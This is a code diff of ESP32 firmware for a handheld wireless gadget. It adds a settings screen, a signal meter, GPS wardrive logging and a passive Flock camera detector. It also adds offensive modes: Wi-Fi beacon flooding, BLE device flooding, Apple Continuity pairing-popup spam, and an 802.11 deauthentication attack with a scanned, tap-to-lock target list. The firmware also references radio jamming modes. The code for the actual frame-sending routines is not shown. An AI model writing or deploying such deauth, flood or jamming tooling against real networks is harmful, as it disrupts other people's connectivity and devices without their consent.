+    currentMode = mode;
+    drawUI();
+    return;
+  }
+
+  // Exiting DEAUTH — tear down WiFi
+  if (currentMode == DEAUTH && mode != DEAUTH) {
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_stop();
+    esp_wifi_deinit();
+    currentMode = mode;
+    drawUI();
+    return;
+  }
+
+  // Exiting tool screens
+  if (currentMode == SIGNAL_METER && mode != SIGNAL_METER) {
+    WiFi.scanDelete();
+    WiFi.disconnect(true);
+    WiFi.mode(WIFI_OFF);
+    currentMode = mode;
+    drawUI();
+    return;
+  }
+  if (currentMode == GPS_WARDRIVE && mode != GPS_WARDRIVE) {
+    if (gpsServerRunning) {
+      gpsServer.stop();
+      gpsServerRunning = false;
+    }
+    WiFi.softAPdisconnect(true);
+    WiFi.disconnect(true);
+    WiFi.mode(WIFI_OFF);
+    SD_MMC.end(); sdOk = false;
+    if (radioAok) configureRadio(radioA, selectRadioA);
+    if (radioBok) configureRadio(radioB, selectRadioB);
+    currentMode = mode;
+    drawUI();
+    return;
+  }
+  if (currentMode == FLOCK_DETECTOR && mode != FLOCK_DETECTOR) {
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
+    esp_wifi_stop();
+    esp_wifi_deinit();
+    currentMode = mode;
+    drawUI();
+    return;
+  }
+
+  // Entering SETTINGS
+  if (mode == SETTINGS) {
+    currentMode = SETTINGS;
+    drawSettingsUI();
+    return;
+  }
+
+  // Entering SIGNAL_METER
+  if (mode == SIGNAL_METER) {
+    sigCount = 0; sigSel = -1; sigLastRssi = -127; sigHistPos = 0; sigLastScanMs = 0;
+    memset(sigHistory, 0, sizeof(sigHistory));
+    WiFi.mode(WIFI_STA);
+    WiFi.disconnect();
+    currentMode = SIGNAL_METER;
+    drawSignalMeterUI();
+    return;
+  }
+
+  // Entering GPS_WARDRIVE
+  if (mode == GPS_WARDRIVE) {
+    gpsFixValid = false; gpsFixMs = 0; gpsLastScanMs = 0; gpsLogged = 0;
+    snprintf(gpsLogFile, sizeof(gpsLogFile), "/jester/gps_%lu.csv", millis() / 1000);
+    if (radioAok) { selectRadioA(); radioA.powerDown(); spiHSPI.end(); }
+    SD_MMC.setPins(SD_CLK, SD_CMD, SD_D0);
+    sdOk = SD_MMC.begin("/sdcard", true);
+    if (sdOk) {
+      wdEnsureDir();
+      File f = SD_MMC.open(gpsLogFile, FILE_WRITE);
+      if (f) {
+        f.println("ms,lat,lon,accuracy,ssid,bssid,rssi,channel,auth");
+        f.close();
+      }
+    }
+    WiFi.mode(WIFI_AP_STA);
+    WiFi.softAP("GIZMO-GPS");
+    gpsServer.on("/", gpsHandleRoot);
+    gpsServer.on("/gps", gpsHandleFix);
+    gpsServer.begin();
+    gpsServerRunning = true;
+    currentMode = GPS_WARDRIVE;
+    drawGpsWardriveUI();
+    return;
+  }
+
+  // Entering passive Flock detector
+  if (mode == FLOCK_DETECTOR) {
+    flockHitCount = 0; flockSeenCount = 0; flockLastRssi = -127;
+    flockLastChannel = 0; flockChannel = 11; flockHopIndex = 0; flockHopMs = millis();
+    flockEventPending = false;
+    strcpy(flockLastMac, "--:--:--:--:--:--");
+    memset(flockSeenMacs, 0, sizeof(flockSeenMacs));
+    wifi_init_config_t wifiCfg = WIFI_INIT_CONFIG_DEFAULT();
+    esp_wifi_init(&wifiCfg);
+    esp_wifi_set_mode(WIFI_MODE_STA);
+    esp_wifi_start();
+    wifi_promiscuous_filter_t filter = {};
+    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
+    esp_wifi_set_promiscuous_filter(&filter);
+    esp_wifi_set_promiscuous_rx_cb(flockPromiscuousCallback);
+    esp_wifi_set_channel(flockChannel, WIFI_SECOND_CHAN_NONE);
+    currentMode = FLOCK_DETECTOR;
+    esp_wifi_set_promiscuous(true);
+    drawFlockDetectorUI();
+    flockDrawValues();
+    return;
+  }
+
   // Entering WARDRIVE
   if (mode == WARDRIVE) {
     wdWifiCount = 0; wdBleCount = 0; wdBtCount = 0;
@@ -1222,23 +2535,85 @@ void activateMode(Mode mode) {
     // WiFi
     wifi_init_config_t wCfg = WIFI_INIT_CONFIG_DEFAULT();
     esp_wifi_init(&wCfg); esp_wifi_set_mode(WIFI_MODE_STA); esp_wifi_start();
-    // BT/BLE stack — init once per boot (BT controller can't be fully re-inited)
-    if (!wdBtInited) {
-      esp_bt_controller_config_t btCfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
-      bool ok = (esp_bt_controller_init(&btCfg)     == ESP_OK) &&
-                (esp_bt_controller_enable(ESP_BT_MODE_BLE)  == ESP_OK) &&
-                (esp_bluedroid_init()                == ESP_OK) &&
-                (esp_bluedroid_enable()              == ESP_OK);
-      if (ok) {
-        esp_ble_gap_register_callback(wdBleGapCb);
-        esp_ble_gap_set_scan_params(&wdBleScanParams);
-        wdBtInited = true;
-      }
-    }
-    if (wdBtInited)
+    // BT/BLE stack — shared idempotent bring-up. Re-register our scan callback
+    // every entry, since a flood mode may have swapped in its own gap callback.
+    if (bleEnsureHost()) {
+      esp_ble_gap_register_callback(wdBleGapCb);
+      esp_ble_gap_set_scan_params(&wdBleScanParams);
+      wdBtInited = true;
       esp_ble_gap_start_scanning(0);  // 0 = continuous
+    }
     currentMode = WARDRIVE;
     drawWardriveUI();
+    return;
+  }
+
+  // Entering BEACON_FLOOD
+  if (mode == BEACON_FLOOD) {
+    bfCount = 0; bfChannel = 1; bfPerChannel = 0;
+    bfRate = 0; bfRateCount = 0; bfLastRateMs = 0; bfLastDrawMs = 0;
+    bfSsidHead = 0;
+    memset(bfSsidLog, 0, sizeof(bfSsidLog));
+    wifi_init_config_t wCfg = WIFI_INIT_CONFIG_DEFAULT();
+    esp_wifi_init(&wCfg);
+    esp_wifi_set_mode(WIFI_MODE_AP);
+    wifi_config_t apCfg = {};
+    memcpy(apCfg.ap.ssid, "GIZMO", 5);
+    apCfg.ap.ssid_len  = 5;
+    apCfg.ap.channel   = 1;
+    apCfg.ap.authmode  = WIFI_AUTH_OPEN;
+    apCfg.ap.max_connection = 0;
+    esp_wifi_set_config(WIFI_IF_AP, &apCfg);
+    esp_wifi_start();
+    currentMode = BEACON_FLOOD;
+    drawBeaconFloodUI();
+    return;
+  }
+
+  // Entering BT_FLOOD (generic BLE device flood)
+  if (mode == BT_FLOOD) {
+    bleEnsureHost();
+    esp_ble_gap_register_callback(floodBleGapCb);
+    floodReset(COL_BTFLOOD);
+    currentMode = BT_FLOOD;
+    drawFloodUI("BT FLOOD", COL_BTFLOOD, "LAST");
+    return;
+  }
+
+  // Entering APPLE_SPAM (Continuity proximity-pairing popups)
+  if (mode == APPLE_SPAM) {
+    bleEnsureHost();
+    esp_ble_gap_register_callback(floodBleGapCb);
+    floodReset(COL_APPLE);
+    currentMode = APPLE_SPAM;
+    drawFloodUI("APPLE SPAM", COL_APPLE, "MODEL");
+    return;
+  }
+
+  // Entering DEAUTH (802.11 deauth against scanned APs)
+  if (mode == DEAUTH) {
+    wifi_init_config_t wCfg = WIFI_INIT_CONFIG_DEFAULT();
+    esp_wifi_init(&wCfg);
+    esp_wifi_set_mode(WIFI_MODE_STA);
+    esp_wifi_start();
+    esp_wifi_set_promiscuous(true);
+    floodReset(COL_DEAUTH);
+    currentMode = DEAUTH;
+    drawFloodUI("DEAUTH", COL_DEAUTH, "TARGET");
+    // Blocking AP scan to build the target list
+    gfx->setTextColor(COL_LABEL); gfx->setTextSize(1);
+    gfx->setCursor(180, BF_LIST_TOP + 40); gfx->print("Scanning APs...");
+    deauthScan();
+    deauthIdx = 0; deauthSel = -1; deauthHopMs = 0;
+    if (deauthCount > 0) {
+      esp_wifi_set_channel(deauthTargets[0].channel, WIFI_SECOND_CHAN_NONE);
+      snprintf(fdMidVal, sizeof fdMidVal, "ALL: %s", deauthTargets[0].ssid);
+    } else {
+      snprintf(fdMidVal, sizeof fdMidVal, "No APs found");
+    }
+    // Clear the "Scanning APs..." text, then draw the selectable target list.
+    gfx->fillRect(0, BF_LIST_TOP, 480, 320 - BF_LIST_TOP, 0x0000);
+    deauthUpdateDisplay();
     return;
   }
 
@@ -1618,6 +2993,7 @@ void runJamWithSpectrum() {
 // ---------------------------------------------------------------------------
 
 void drawBackButton() {
+  titleBarHasBackButton = true;
   gfx->drawRect(2, 5, 62, 28, COL_ACTIVE);
   gfx->setTextColor(COL_ACTIVE);
   gfx->setTextSize(1);
@@ -1958,6 +3334,14 @@ void executeMode() {
     case NETSCAN:                      runNetScan();           break;
     case WARDRIVE:                     runWardrive();          break;
     case LOGS:                         delay(50);              break;
+    case BEACON_FLOOD:                 runBeaconFlood();       break;
+    case BT_FLOOD:                     runBtFlood();           break;
+    case APPLE_SPAM:                   runAppleSpam();         break;
+    case DEAUTH:                       runDeauth();            break;
+    case SETTINGS:                     runSettings();          break;
+    case SIGNAL_METER:                 runSignalMeter();       break;
+    case GPS_WARDRIVE:                 runGpsWardrive();       break;
+    case FLOCK_DETECTOR:               runFlockDetector();     break;
   }
 }
 
@@ -2055,8 +3439,81 @@ void handleTouch() {
     return;
   }
 
+  // SETTINGS touch handling
+  if (currentMode == SETTINGS) {
+    if (tx < 65 && ty < TITLE_H) { activateMode(OFF); return; }
+    if (ty >= TITLE_H + 18 && ty < TITLE_H + 18 + 5 * 42) {
+      int row = (ty - TITLE_H - 18) / 42;
+      if (row == 0) {
+        int idx = (settingsDefaultIndex() + 1) % SETTINGS_DEFAULT_COUNT;
+        saveDefaultMode(settingsDefaultModes[idx]);
+        drawSettingsUI();
+      } else if (row == 1) {
+        radioPaSetting = (radioPaSetting + 1) % 3;
+        settingsSavePa();
+        drawSettingsUI();
+      }
+    }
+    return;
+  }
+
+  // SIGNAL METER touch handling
+  if (currentMode == SIGNAL_METER) {
+    if (tx < 65 && ty < TITLE_H) { activateMode(OFF); return; }
+    if (ty >= TITLE_H && ty < TITLE_H + 132) {
+      int row = (ty - TITLE_H) / 22;
+      if (row >= 0 && row < sigCount) {
+        sigSel = row;
+        sigHistPos = 0;
+        memset(sigHistory, 0, sizeof(sigHistory));
+        sigLastRssi = sigAps[row].rssi;
+        signalPushRssi(sigLastRssi);
+        drawSignalMeterUI();
+      }
+    }
+    return;
+  }
+
+  // GPS WARDRIVE touch handling
+  if (currentMode == GPS_WARDRIVE) {
+    if (tx < 65 && ty < TITLE_H) { activateMode(OFF); return; }
+    return;
+  }
+
+  // DEAUTH: tap a target row to lock onto it (tap again to unlock); tap the
+  // stats bar to return to ALL/auto-hop.
+  if (currentMode == DEAUTH) {
+    if (tx < 65 && ty < TITLE_H) { activateMode(OFF); return; }
+    if (ty >= TITLE_H && ty < BF_LIST_TOP) {       // stats bar -> back to ALL
+      if (deauthSel != -1 && deauthCount > 0) {
+        deauthSel = -1;
+        snprintf(fdMidVal, sizeof fdMidVal, "ALL: %s", deauthTargets[deauthIdx].ssid);
+        deauthUpdateDisplay();
+      }
+      return;
+    }
+    if (ty >= BF_LIST_TOP && deauthCount > 0) {    // list -> lock target
+      int r = (ty - BF_LIST_TOP) / BF_ROW_H;
+      if (r >= 0 && r < deauthCount) {
+        if (deauthSel == r) {                       // tap locked row -> unlock
+          deauthSel = -1;
+          snprintf(fdMidVal, sizeof fdMidVal, "ALL: %s", deauthTargets[deauthIdx].ssid);
+        } else {
+          deauthSel = r; deauthIdx = r;
+          esp_wifi_set_channel(deauthTargets[r].channel, WIFI_SECOND_CHAN_NONE);
+          snprintf(fdMidVal, sizeof fdMidVal, "LOCK: %s", deauthTargets[r].ssid);
+        }
+        deauthUpdateDisplay();
+      }
+    }
+    return;
+  }
+
   // Other full-screen modes: only < HOME exits
-  if (currentMode == SPECTRUM || currentMode == NETSCAN || isJamMode(currentMode)) {
+  if (currentMode == SPECTRUM || currentMode == NETSCAN || currentMode == BEACON_FLOOD ||
+      currentMode == BT_FLOOD || currentMode == APPLE_SPAM ||
+      currentMode == FLOCK_DETECTOR ||
+      isJamMode(currentMode)) {
     if (tx < 65 && ty < TITLE_H)
       activateMode(OFF);
     return;
@@ -2064,17 +3521,18 @@ void handleTouch() {
 
   // Home grid — check page-flip zone first (right edge of title bar)
   if (ty < TITLE_H && tx >= 395 && tx < 430) {
-    uiPage = 1 - uiPage;
+    uiPage = (uiPage + 1) % 3;
     drawUI();
     return;
   }
 
   // Button grid (page-aware)
-  int bStart = (uiPage == 0) ? 0 : 6;
-  int bCount = (uiPage == 0) ? 6 : 2;
+  int bStart = uiPage * 6;
+  int bCount = 6;
   for (int i = bStart; i < bStart + bCount; i++) {
+    if (!buttons[i].label[0]) continue;
     // Map logical button to visual position
-    int vi   = (uiPage == 0) ? i : (i - 6);
+    int vi   = i - bStart;
     int bx   = (vi % 3) * BTN_W;
     int by   = TITLE_H + (vi / 3) * BTN_H;
     if (tx >= bx && tx < bx + BTN_W && ty >= by && ty < by + BTN_H) {
@@ -2101,11 +3559,30 @@ void handleCommand() {
   else if (inputString == "mode:jamtime")      { activateMode(JAMTIME); }
   else if (inputString == "mode:spectrum")     { activateMode(SPECTRUM); }
   else if (inputString == "mode:netscan")      { activateMode(NETSCAN); }
+  else if (inputString == "mode:settings")     { activateMode(SETTINGS); }
+  else if (inputString == "mode:signal")       { activateMode(SIGNAL_METER); }
+  else if (inputString == "mode:gps")          { activateMode(GPS_WARDRIVE); }
+  else if (inputString == "mode:flock")        { activateMode(FLOCK_DETECTOR); }
   else if (inputString == "default:off")       { saveDefaultMode(OFF); }
   else if (inputString == "default:wifi")      { saveDefaultMode(WIFI); }
   else if (inputString == "default:bluetooth") { saveDefaultMode(BLUETOOTH); }
   else if (inputString == "default:ble")       { saveDefaultMode(BLE); }
   else if (inputString == "default:jamtime")   { saveDefaultMode(JAMTIME); }
+  else if (inputString == "battery" || inputString == "bat") {
+    printBatteryStatus();
+  }
+  else if (inputString.startsWith("gps:")) {
+    int comma = inputString.indexOf(',', 4);
+    if (comma > 4) {
+      gpsLat = inputString.substring(4, comma).toDouble();
+      gpsLon = inputString.substring(comma + 1).toDouble();
+      gpsAcc = 0;
+      gpsFixMs = millis();
+      gpsFixValid = true;
+      Serial.printf("GPS: %.6f,%.6f\n", gpsLat, gpsLon);
+      if (currentMode == GPS_WARDRIVE) gpsDrawStatus();
+    }
+  }
   else if (inputString.startsWith("diag:")) {
     int ch = inputString.substring(5).toInt();
     if (ch >= 0 && ch <= 125) {
@@ -2141,10 +3618,20 @@ void setup() {
   // 2. Init AXP2101 PMIC (PWR button)
   pmuOk = PMU.begin(Wire, AXP2101_SLAVE_ADDRESS, I2C_SDA, I2C_SCL);
   if (pmuOk) {
+    PMU.enableBattDetection();
+    PMU.enableBattVoltageMeasure();
+    PMU.enableVbusVoltageMeasure();
+    PMU.enableSystemVoltageMeasure();
     PMU.disableIRQ(XPOWERS_AXP2101_ALL_IRQ);
     PMU.enableIRQ(XPOWERS_AXP2101_PKEY_SHORT_IRQ);
     PMU.clearIrqStatus();
+    pollBattery(true);
   }
+
+  preferences.begin("rfclown", false);
+  radioPaSetting = preferences.getUChar("pa", radioPaSetting);
+  if (radioPaSetting > 2) radioPaSetting = 2;
+  preferences.end();
 
   // 3. Init TCA9554 at 0x20
   tca.begin();
@@ -2290,6 +3777,7 @@ void loop() {
   if (!deviceOn) return;
   handleTouch();
   executeMode();
+  refreshBatteryWidget();
   serialEvent();  // ESP32 Arduino doesn't auto-call this; do it explicitly
 }
 
